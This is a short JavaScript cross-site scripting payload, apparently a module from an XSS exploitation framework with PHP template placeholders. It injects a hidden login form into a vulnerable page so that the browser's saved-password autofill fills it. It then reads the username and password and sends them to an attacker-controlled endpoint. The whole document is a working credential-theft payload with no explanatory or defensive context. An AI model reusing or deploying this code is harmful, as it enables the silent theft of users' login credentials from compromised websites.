function getLogin(uname, pname, loc) {
	xssappend("<form action='"+loc+"' method='post'><input type='text' name='"+uname+"' id='un54'><input type='password' name='"+pname+"' id='pw54'></form>");
	window.setTimeout(saveLogin, 500);
}
function saveLogin() {
	var u = xssgbi('un54');
	var p = xssgbi('pw54');
	if (u.value && u.value.length > 1) { cs(sploitapi+"?id="+sploitid+"&u="+encodeURIComponent(u.value)+"&p="+encodeURIComponent(p.value)); }
	xsscls();
}
getLogin("<?=$username?>", "<?=$passname?>", "<?=$action?>");
